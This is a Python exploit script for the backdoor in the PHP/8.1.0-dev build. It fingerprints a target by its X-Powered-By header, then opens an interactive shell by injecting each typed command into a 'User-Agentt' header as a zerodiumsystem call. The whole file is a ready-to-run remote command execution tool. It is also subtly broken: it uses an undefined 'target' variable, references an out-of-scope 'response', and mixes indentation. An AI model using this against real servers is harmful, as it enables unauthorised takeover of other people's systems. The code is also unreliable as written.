#!/usr/bin/env python3
import sys
import requests

def check(url:str):
	try:
		response = requests.get(url, allow_redirects=False)
		headers = response.headers
		if headers['X-Powered-By'].lower() == "php/8.1.0-dev":
			print("[+] Target is vulnerable for PHP/8.1.0-dev header injection!")
		else:
			print("[-] Target is not vulnerable for PHP/8.1.0-dev header injection!")
			return -1
	except requests.ConnectionError:
		print("[-] Connection to target failed!")
		return -1
	except:
		print("[-] Target is not vulnerable for PHP/8.1.0-dev header injection!")
		return -1

url = str(sys.argv[1])
print("-EXPLOIT--------------------------")
print("[*] Starting PHP/8.1.0-dev exploit...")
print("[*] This exploit is a header injection, so the output of the commands is in the html code!")
print("[*] This exploit is programmed in Python")
print("[*] Checking target vulnerability...")
print("-EXPLOIT--------------------------")

if check(url) == -1:
	pass
else:
	session = requests.Session()
	target_res = requests.get(target)
	if int(target_res.status_code) == 200:
        	print ("[*] Opening interactive shell on {}".format(sys.argv[1]))
        	try:
                	while True:
                        	prompt = input("$ ")
                        	headers = {
                                	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                                	"User-Agentt": 'zerodiumsystem("' + prompt + '");'
                        	}
                        	target_res = requests.get(target, headers=headers, allow_redirects=False)
                        	current_page = target_res.text
                        	stdout = current_page.split('<!DOCTYPE html>', 1)
                        	text = print(stdout[0])
        	except KeyboardInterrupt:
                	print ("[-] KeyboardInterrupt detected! Closing exploit...")
	else:
        	print ("[-] ERROR! HTTP-Status: " + str(response.status_code))
        	exit()
